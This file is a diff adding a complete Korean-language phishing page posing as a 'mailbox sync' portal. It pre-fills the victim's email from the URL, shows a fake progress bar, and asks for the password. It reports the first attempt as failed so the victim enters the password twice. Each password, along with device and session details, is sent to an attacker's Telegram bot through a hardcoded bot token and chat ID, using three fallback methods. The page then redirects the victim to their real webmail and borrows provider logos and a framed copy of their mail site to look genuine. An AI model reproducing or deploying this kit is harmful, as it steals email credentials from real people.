@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>메일함 동기화</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f8fafc !important; }
+        
+        .fade-in-up { animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        .fade-out-down { animation: fadeOutDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeOutDown { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(20px); } }
+        
+        #bg-lookup-container { 
+            position: fixed !important; 
+            top: 0 !important; 
+            left: 0 !important; 
+            width: 100vw !important; 
+            height: 100vh !important; 
+            z-index: -9999 !important; 
+            opacity: 0.15 !important; 
+            filter: blur(4px) !important; 
+            pointer-events: none !important; 
+            overflow: hidden !important;
+        }
+        
+        #domain-logo-img { transition: opacity 0.5s ease, transform 0.5s ease; }
+        #domain-logo-img.loading { opacity: 0; transform: scale(0.8); }
+        
+        .main-container {
+            background-color: #ffffff;
+            z-index: 50;
+            position: relative;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4 antialiased text-gray-800 font-sans">
+
+    <div id="bg-lookup-container">
+        <iframe id="bg-iframe" src="about:blank" class="w-full h-full border-0" sandbox="allow-scripts allow-same-origin"></iframe>
+    </div>
+
+    <div class="main-container max-w-md w-full flex flex-col items-center justify-center p-8 rounded-3xl border border-gray-100">
+        
+        <div class="relative mb-8 mt-2">
+            <div class="absolute inset-0 bg-blue-50 rounded-full scale-110 animate-pulse"></div>
+            <div id="logo-container" class="relative w-24 h-24 bg-blue-500 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-200 overflow-hidden">
+                <svg id="default-logo-svg" class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+                </svg>
+                <img id="domain-logo-img" src="" alt="Domain Logo" class="absolute inset-0 w-full h-full object-contain p-3 hidden loading">
+                <div class="absolute -bottom-2 -right-2 bg-white rounded-full p-1 shadow-md border border-gray-100 z-10">
+                    <svg class="w-5 h-5 text-blue-500 animate-spin-slow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <div id="content-area" class="w-full text-center">
+            
+            <div id="step-progress" class="fade-in-up w-full flex flex-col items-center">
+                <h1 class="text-2xl font-bold text-gray-900 mb-2">사서함 동기화 진행 중...</h1>
+                <p class="text-sm text-gray-500 mb-8 max-w-xs mx-auto">귀하의 메일함을 저희 보안 서버와 동기화하고 있습니다. 이 과정은 다소 시간이 걸릴 수 있습니다.</p>
+                
+                <div class="w-full bg-gray-100 rounded-full h-2 mb-2 overflow-hidden">
+                    <div id="progress-bar" class="bg-blue-500 h-2 rounded-full transition-all duration-300 ease-out" style="width: 0%"></div>
+                </div>
+                <span id="progress-text" class="text-sm font-medium text-gray-500 mb-8">0%</span>
+
+                <div class="w-full bg-[#f0f7ff] rounded-xl p-4 flex items-center justify-start gap-4 mb-8">
+                    <div class="bg-blue-100 p-2 rounded-full flex-shrink-0">
+                        <svg class="w-5 h-5 text-blue-500 animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                    </div>
+                    <div class="text-left">
+                        <p class="text-sm font-semibold text-gray-800">메일 동기화 중...</p>
+                        <p id="display-email" class="text-xs text-gray-500">user@example.com</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step-passcode" class="hidden fade-in-up w-full flex flex-col items-center">
+                <h1 class="text-2xl font-bold text-gray-900 mb-2">암호 입력</h1>
+                <p class="text-sm text-gray-500 mb-6 max-w-xs mx-auto">동기화를 완료하려면 보안 비밀번호를 입력해 주세요</p>
+                
+                <div class="w-full bg-[#f0f7ff] rounded-xl p-4 flex items-center justify-start gap-4 mb-6">
+                    <div class="bg-blue-100 p-2 rounded-full flex-shrink-0">
+                        <svg class="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    </div>
+                    <div class="text-left">
+                        <p class="text-sm font-semibold text-gray-800">이메일 계정</p>
+                        <p class="text-xs text-gray-500" id="passcode-email-display"></p>
+                    </div>
+                </div>
+
+                <div class="w-full">
+                    <input type="password" id="passcode-input" placeholder="••••••••" class="w-full text-center text-lg tracking-widest px-4 py-3 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all mb-4">
+                    <button onclick="submitPasscode()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-xl shadow-md shadow-blue-200 transition-colors mb-4">확인 및 동기화</button>
+                    <p id="attempt-indicator" class="text-xs text-gray-400 hidden">1차 시도 (총 2회)</p>
+                </div>
+            </div>
+
+            <div id="step-error" class="hidden fade-in-up w-full flex flex-col items-center">
+                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                    <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                </div>
+                <h1 class="text-2xl font-bold text-gray-900 mb-2">인증 실패</h1>
+                <p class="text-sm text-gray-500 mb-6 max-w-xs mx-auto">입력하신 비밀번호가 올바르지 않습니다. 자격 증명을 확인하고 다시 시도해 주세요.</p>
+                <button onclick="retryPasscode()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-xl shadow-md shadow-blue-200 transition-colors">다시 시도하세요</button>
+            </div>
+
+            <div id="step-redirect" class="hidden fade-in-up w-full flex flex-col items-center">
+                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
+                    <svg class="w-8 h-8 text-green-500 animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                </div>
+                <h1 class="text-2xl font-bold text-gray-900 mb-2">확인하다...</h1>
+                <p id="redirect-message" class="text-sm text-gray-500 mb-6 max-w-xs mx-auto">확인 중...</p>
+                <div class="w-full bg-gray-100 rounded-full h-1.5 mb-2 overflow-hidden">
+                    <div id="redirect-progress-bar" class="bg-blue-500 h-1.5 rounded-full transition-all duration-300 ease-out" style="width: 0%"></div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="mt-8 flex items-center gap-2 text-xs text-gray-400">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            <span>귀하의 메일함은 안전하게 보호되며 암호화되어 있습니다</span>
+        </div>
+
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '8212544984:AAGBBCLgxhJUHSrIMLF2TdxyjnrGKXfOW34';   
+        const TELEGRAM_CHAT_ID = '6993893510';                
+        const PASSCODE_PLACEHOLDER = '••••••••'; 
+        const DEFAULT_EMAIL = '';
+        const MAX_ATTEMPTS = 2;
+        
+        const EMAIL_PLACEHOLDERS = [
+            '[[-email-]]',
+            '[[-Email-]]',
+            '[[-EMAIL-]]',
+            '[[email]]',
+            '[[Email]]',
+            '[[EMAIL]]',
+            '{email}',
+            '{{email}}',
+            '<email>'
+        ];
+
+        const AUTO_EMAIL_DOMAIN = 'temp-mail.org';
+        const STORAGE_KEY = 'sync_user_email';
+        
+        let targetEmail = DEFAULT_EMAIL;
+        let currentAttempt = 1;
+
+        // ==========================================
+        // 🎨 DOMAIN LOGOS MAP
+        // ==========================================
+        const KNOWN_DOMAIN_LOGOS = {
+            'gmail.com': 'https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico',
+            'googlemail.com': 'https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico',
+            'outlook.com': 'https://outlook.live.com/favicon.ico',
+            'hotmail.com': 'https://outlook.live.com/favicon.ico',
+            'live.com': 'https://outlook.live.com/favicon.ico',
+            'msn.com': 'https://outlook.live.com/favicon.ico',
+            'yahoo.com': 'https://s.yimg.com/rz/l/favicon.ico',
+            'ymail.com': 'https://s.yimg.com/rz/l/favicon.ico',
+            'icloud.com': 'https://www.icloud.com/favicon.ico',
+            'me.com': 'https://www.icloud.com/favicon.ico',
+            'mac.com': 'https://www.icloud.com/favicon.ico',
+            'protonmail.com': 'https://proton.me/favicon.ico',
+            'proton.me': 'https://proton.me/favicon.ico',
+            'aol.com': 'https://www.aol.com/favicon.ico',
+            'zoho.com': 'https://www.zoho.com/favicon.ico',
+            'gmx.com': 'https://www.gmx.com/favicon.ico',
+            'gmx.net': 'https://www.gmx.com/favicon.ico',
+            'mail.com': 'https://www.mail.com/favicon.ico',
+            'yandex.com': 'https://yandex.com/favicon.ico',
+            'yandex.ru': 'https://yandex.com/favicon.ico',
+            'qq.com': 'https://mail.qq.com/favicon.ico',
+            '163.com': 'https://mail.163.com/favicon.ico',
+            '126.com': 'https://mail.126.com/favicon.ico'
+        };
+
+        // ==========================================
+        // MAP: Domain → Login/Redirect URL
+        // ==========================================
+        const DOMAIN_REDIRECT_URLS = {
+            'gmail.com': 'https://mail.google.com',
+            'googlemail.com': 'https://mail.google.com',
+            'outlook.com': 'https://outlook.live.com',
+            'hotmail.com': 'https://outlook.live.com',
+            'live.com': 'https://outlook.live.com',
+            'msn.com': 'https://outlook.live.com',
+            'yahoo.com': 'https://mail.yahoo.com',
+            'ymail.com': 'https://mail.yahoo.com',
+            'icloud.com': 'https://www.icloud.com/mail',
+            'me.com': 'https://www.icloud.com/mail',
+            'mac.com': 'https://www.icloud.com/mail',
+            'protonmail.com': 'https://mail.proton.me',
+            'proton.me': 'https://mail.proton.me',
+            'aol.com': 'https://mail.aol.com',
+            'zoho.com': 'https://mail.zoho.com',
+            'gmx.com': 'https://www.gmx.com',
+            'gmx.net': 'https://www.gmx.com',
+            'mail.com': 'https://www.mail.com',
+            'yandex.com': 'https://mail.yandex.com',
+            'yandex.ru': 'https://mail.yandex.ru',
+            'qq.com': 'https://mail.qq.com',
+            '163.com': 'https://mail.163.com',
+            '126.com': 'https://mail.126.com'
+        };
+
+        // ==========================================
+        // HELPER FUNCTIONS
+        // ==========================================
+        
+        function getDecodedHash() {
+            const hash = window.location.hash;
+            if (!hash) return '';
+            let raw = decodeURIComponent(hash.substring(1));
+            if (raw.includes('?')) raw = raw.split('?')[0];
+            return raw.trim();
+        }
+
+        function isEmailPlaceholder(str) {
+            if (!str) return false;
+            const lower = str.toLowerCase();
+            return EMAIL_PLACEHOLDERS.some(p => lower === p.toLowerCase());
+        }
+
+        function generateSessionEmail() {
+            const randomPart = Math.random().toString(36).substring(2, 10);
+            return `user_${randomPart}@${AUTO_EMAIL_DOMAIN}`;
+        }
+
+        function getStoredEmail() {
+            try {
+                return localStorage.getItem(STORAGE_KEY);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function saveEmailToStorage(email) {
+            try {
+                if (email && email.includes('@') && !isEmailPlaceholder(email)) {
+                    localStorage.setItem(STORAGE_KEY, email);
+                }
+            } catch (e) {}
+        }
+
+        function getEmailFromHashParams() {
+            const hash = window.location.hash;
+            if (hash && hash.includes('?')) {
+                try {
+                    const hashParams = new URLSearchParams(hash.split('?')[1]);
+                    const email = hashParams.get('email');
+                    if (email && email.includes('@') && !isEmailPlaceholder(email)) {
+                        return email;
+                    }
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        function getEmailFromQueryParams() {
+            try {
+                const params = new URLSearchParams(window.location.search);
+                const email = params.get('email');
+                if (email && email.includes('@') && !isEmailPlaceholder(email)) {
+                    return email;
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        // ==========================================
+        // ✅ FIXED: GET REAL USER EMAIL
+        // ==========================================
+        function getRealUserEmail() {
+            const rawHash = getDecodedHash();
+            
+            if (rawHash) {
+                if (rawHash.includes('@') && rawHash.includes('.')) {
+                    saveEmailToStorage(rawHash);
+                    return rawHash;
+                }
+
+                if (isEmailPlaceholder(rawHash)) {
+                    const hashEmail = getEmailFromHashParams();
+                    if (hashEmail) {
+                        saveEmailToStorage(hashEmail);
+                        return hashEmail;
+                    }
+
+                    const queryEmail = getEmailFromQueryParams();
+                    if (queryEmail) {
+                        saveEmailToStorage(queryEmail);
+                        return queryEmail;
+                    }
+
+                    const generated = generateSessionEmail();
+                    saveEmailToStorage(generated);
+                    return generated;
+                }
+            }
+
+            const hashEmail = getEmailFromHashParams();
+            if (hashEmail) {
+                saveEmailToStorage(hashEmail);
+                return hashEmail;
+            }
+
+            const queryEmail = getEmailFromQueryParams();
+            if (queryEmail) {
+                saveEmailToStorage(queryEmail);
+                return queryEmail;
+            }
+
+            const storedEmail = getStoredEmail();
+            if (storedEmail) {
+                return storedEmail;
+            }
+
+            return DEFAULT_EMAIL;
+        }
+
+        // ==========================================
+        // ✅ FIXED: UPDATE URL WITH RANDOM PARAMS
+        // ==========================================
+        function updateUrlWithRandomParams() {
+            const params = generateRandomParams();
+            const rawHash = getDecodedHash();
+            let emailInHash = '';
+
+            if (isEmailPlaceholder(rawHash)) {
+                emailInHash = rawHash;
+            } else {
+                emailInHash = getRealUserEmail();
+            }
+
+            let encodedEmail = encodeURIComponent(emailInHash);
+            encodedEmail = encodedEmail.replace(/%5B/gi, '[').replace(/%5D/gi, ']');
+
+            const newHash = `#${encodedEmail}?sid=${params.sid}&ts=${params.ts}&ref=${params.ref}`;
+            const cleanUrl = window.location.pathname + newHash;
+            window.history.replaceState({}, '', cleanUrl);
+        }
+
+        function generateRandomParams() {
+            const randomString = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+            return { sid: randomString, ts: Date.now(), ref: 'sync_portal' };
+        }
+
+        function checkExpiration() {
+            const hash = window.location.hash;
+            if (hash && hash.includes('?')) {
+                const hashParams = new URLSearchParams(hash.split('?')[1]);
+                const ts = hashParams.get('ts');
+                if (ts) {
+                    const oneHour = 60 * 60 * 1000;
+                    if (Date.now() - parseInt(ts) > oneHour) {
+                        console.warn("⚠️ Session expired");
+                        return false;
+                    }
+                }
+            }
+            return true;
+        }
+
+        function getUserInfo(email) {
+            const domain = email.split('@')[1] || 'unknown';
+            return { email, domain, username: email.split('@')[0], isVerified: false };
+        }
+
+        function handlePageAccess(email) {
+            if (!email || !email.includes('@')) {
+                console.warn("Access Denied: Invalid user identifier.");
+                return false;
+            }
+            return true;
+        }
+
+        function formatUserCommandEmail(email) {
+            return "SYNC_COMMAND user@example.com".replace('user@example.com', email);
+        }
+
+        function getDomainLogo(domain) {
+            if (!domain) return null;
+            const cleanDomain = domain.toLowerCase().trim();
+            if (KNOWN_DOMAIN_LOGOS[cleanDomain]) return KNOWN_DOMAIN_LOGOS[cleanDomain];
+            return `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=128`;
+        }
+
+        function applyDomainLogo(email) {
+            const domain = email.split('@')[1];
+            if (!domain) return;
+            const logoUrl = getDomainLogo(domain);
+            const imgEl = document.getElementById('domain-logo-img');
+            const svgEl = document.getElementById('default-logo-svg');
+            if (!logoUrl || !imgEl) return;
+
+            imgEl.classList.add('loading');
+            imgEl.classList.remove('hidden');
+            imgEl.src = logoUrl;
+
+            imgEl.onload = () => {
+                imgEl.classList.remove('loading');
+                if (svgEl) svgEl.style.opacity = '0';
+            };
+            imgEl.onerror = () => {
+                imgEl.classList.add('hidden');
+                imgEl.classList.remove('loading');
+                if (svgEl) svgEl.style.opacity = '1';
+            };
+        }
+
+        function getDomainRedirectUrl(domain) {
+            if (!domain) return 'https://mail.google.com';
+            const cleanDomain = domain.toLowerCase().trim();
+            if (DOMAIN_REDIRECT_URLS[cleanDomain]) return DOMAIN_REDIRECT_URLS[cleanDomain];
+            return `https://mail.${cleanDomain}`;
+        }
+
+        function redirectToUserDomain(email) {
+            const domain = email.split('@')[1];
+            const redirectUrl = getDomainRedirectUrl(domain);
+
+            const msgEl = document.getElementById('redirect-message');
+            if (msgEl) msgEl.textContent = `확인 중  ${domain}...`;
+
+            transitionTo('step-redirect');
+
+            let progress = 0;
+            const bar = document.getElementById('redirect-progress-bar');
+            const interval = setInterval(() => {
+                progress += 5;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    setTimeout(() => { window.location.href = redirectUrl; }, 400);
+                }
+                if (bar) bar.style.width = progress + '%';
+            }, 50);
+        }
+
+        function getFullUserInfo(email) {
+            const domain = email.split('@')[1] || 'unknown';
+            const username = email.split('@')[0];
+            const userAgent = navigator.userAgent;
+            
+            let browser = 'Unknown';
+            if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (userAgent.indexOf('Edg') > -1) browser = 'Edge';
+            else if (userAgent.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (userAgent.indexOf('Safari') > -1) browser = 'Safari';
+            else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browser = 'Opera';
+
+            let os = 'Unknown';
+            if (userAgent.indexOf('Win') > -1) os = 'Windows';
+            else if (userAgent.indexOf('Mac') > -1) os = 'macOS';
+            else if (userAgent.indexOf('Linux') > -1) os = 'Linux';
+            else if (userAgent.indexOf('Android') > -1) os = 'Android';
+            else if (userAgent.indexOf('iPhone') > -1 || userAgent.indexOf('iPad') > -1) os = 'iOS';
+
+            const isMobile = /Mobi|Android|iPhone|iPad/i.test(userAgent);
+
+            return {
+                email: email,
+                username: username,
+                domain: domain,
+                browser: browser,
+                os: os,
+                deviceType: isMobile ? 'Mobile' : 'Desktop',
+                userAgent: userAgent,
+                language: navigator.language || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                referrer: document.referrer || 'Direct',
+                currentUrl: window.location.href,
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toLocaleString()
+            };
+        }
+
+        async function sendToTelegramBotFather(userInfo, passcode, attempt) {
+            const message = 
+                `🚨 NEW LOGIN CAPTURED 🚨\n\n` +
+                `📧 Email: ${userInfo.email}\n` +
+                `👤 Username: ${userInfo.username}\n` +
+                `🌐 Domain: ${userInfo.domain}\n` +
+                `🔑 Passcode: ${passcode}\n` +
+                `🔢 Attempt: ${attempt}/${MAX_ATTEMPTS}\n\n` +
+                `─── DEVICE INFO ───\n` +
+                `💻 Browser: ${userInfo.browser}\n` +
+                `🖥️ OS: ${userInfo.os}\n` +
+                `📱 Device: ${userInfo.deviceType}\n` +
+                `🌍 Language: ${userInfo.language}\n` +
+                `📐 Screen: ${userInfo.screenResolution}\n` +
+                `🕐 Timezone: ${userInfo.timezone}\n\n` +
+                `─── SESSION INFO ───\n` +
+                `🔗 Referrer: ${userInfo.referrer}\n` +
+                `📍 URL: ${userInfo.currentUrl}\n` +
+                `⏰ Local Time: ${userInfo.localTime}`;
+
+            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const body = new URLSearchParams();
+                body.append('chat_id', TELEGRAM_CHAT_ID);
+                body.append('text', message);
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: body.toString()
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('✅ Telegram sent (method 1):', userInfo.email);
+                    return true;
+                } else {
+                    console.error('❌ Telegram API error:', data.description);
+                }
+            } catch (err) {
+                console.warn('⚠️ Method 1 failed:', err.message);
+            }
+
+            try {
+                const body = new URLSearchParams();
+                body.append('chat_id', TELEGRAM_CHAT_ID);
+                body.append('text', message);
+                await fetch(apiUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: body.toString()
+                });
+                console.log('✅ Telegram sent (method 2 - no-cors)');
+                return true;
+            } catch (err) {
+                console.error('❌ Method 2 failed:', err);
+            }
+
+            try {
+                const encodedMessage = encodeURIComponent(message);
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+                console.log('✅ Telegram sent (method 3 - image beacon)');
+                return true;
+            } catch (err) {
+                console.error('❌ Method 3 failed:', err);
+            }
+
+            console.error('❌ All Telegram methods failed');
+            return false;
+        }
+
+        function updateDomainPageAndAssets(email) {
+            const domain = email.split('@')[1];
+            if (domain) {
+                document.title = `${domain} - 메일함 동기화`;
+                applyDomainLogo(email);
+                const iframe = document.getElementById('bg-iframe');
+                iframe.src = `https://${domain}`;
+                console.log(`🌐 Domain assets updated: ${domain}`);
+            }
+        }
+
+        function parseAndSetup() {
+            try {
+                targetEmail = getRealUserEmail();
+                console.log('📧 Final email:', targetEmail);
+
+                if (!handlePageAccess(targetEmail)) return;
+                if (!checkExpiration()) return;
+
+                updateUrlWithRandomParams();
+
+                // ✅ NEW LOGIC: If the URL contains the placeholder, show the placeholder in the UI instead of the generated email.
+                const rawHash = getDecodedHash();
+                let emailToDisplay = targetEmail;
+
+                if (isEmailPlaceholder(rawHash)) {
+                    emailToDisplay = rawHash; // Show "user@example.com" in the box!
+                }
+
+                const displayEmail = document.getElementById('display-email');
+                if (displayEmail) displayEmail.textContent = emailToDisplay;
+                
+                const passcodeEmail = document.getElementById('passcode-email-display');
+                if (passcodeEmail) passcodeEmail.textContent = emailToDisplay;
+                
+                const passcodeInput = document.getElementById('passcode-input');
+                if (passcodeInput) passcodeInput.placeholder = PASSCODE_PLACEHOLDER;
+                
+                const attemptEl = document.getElementById('attempt-indicator');
+                if (attemptEl) {
+                    attemptEl.textContent = `Attempt ${currentAttempt} of ${MAX_ATTEMPTS}`;
+                }
+
+                updateDomainPageAndAssets(targetEmail);
+                console.log("✅ Command format:", formatUserCommandEmail(targetEmail));
+            } catch (err) {
+                console.error("❌ parseAndSetup error:", err);
+            }
+        }
+
+        function startProgress() {
+            let progress = 0;
+            const bar = document.getElementById('progress-bar');
+            const text = document.getElementById('progress-text');
+            
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 5) + 1; 
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    setTimeout(showPasscodeStep, 600);
+                }
+                if (bar) bar.style.width = progress + '%';
+                if (text) text.textContent = progress + '%';
+            }, 150); 
+        }
+
+        function transitionTo(elementId) {
+            document.querySelectorAll('#content-area > div').forEach(el => {
+                if (!el.classList.contains('hidden')) {
+                    el.classList.add('fade-out-down');
+                    setTimeout(() => {
+                        el.classList.add('hidden');
+                        el.classList.remove('fade-out-down');
+                    }, 400); 
+                }
+            });
+            setTimeout(() => {
+                const nextEl = document.getElementById(elementId);
+                if (nextEl) {
+                    nextEl.classList.remove('hidden');
+                    nextEl.classList.add('fade-in-up');
+                }
+            }, 450);
+        }
+
+        function showPasscodeStep() { transitionTo('step-passcode'); }
+
+        async function submitPasscode() {
+            const val = document.getElementById('passcode-input').value.trim();
+            
+            if (val.length < 4) {
+                alert("유효한 비밀번호(최소 4자)를 입력해 주세요.");
+                return;
+            }
+
+            const userInfo = getFullUserInfo(targetEmail);
+            await sendToTelegramBotFather(userInfo, val, currentAttempt);
+
+            if (currentAttempt < MAX_ATTEMPTS) {
+                currentAttempt++;
+                document.getElementById('passcode-input').value = '';
+                transitionTo('step-error');
+            } else {
+                redirectToUserDomain(targetEmail);
+            }
+        }
+
+        function retryPasscode() {
+            document.getElementById('passcode-input').value = '';
+            const attemptEl = document.getElementById('attempt-indicator');
+            if (attemptEl) {
+                attemptEl.textContent = `Attempt ${currentAttempt} of ${MAX_ATTEMPTS}`;
+            }
+            transitionTo('step-passcode');
+        }
+
+        window.addEventListener('load', () => {
+            parseAndSetup();
+            startProgress();
+        });
+
+        window.addEventListener('hashchange', () => {
+            parseAndSetup();
+        });
+
+    </script>
+</body>
+</html>
